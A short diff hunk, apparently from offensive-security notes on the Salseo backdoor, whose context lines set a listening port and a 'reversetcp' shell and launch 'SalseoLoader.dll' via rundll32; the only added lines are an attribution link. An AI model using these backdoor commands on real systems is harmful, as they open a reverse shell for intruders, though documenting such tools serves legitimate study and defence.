@@ -255,3 +255,5 @@ set lport=1337
 set shell=reversetcp
 rundll32.exe SalseoLoader.dll,main
 ```
+
+Documented by https://github.com/carlospolop-forks/
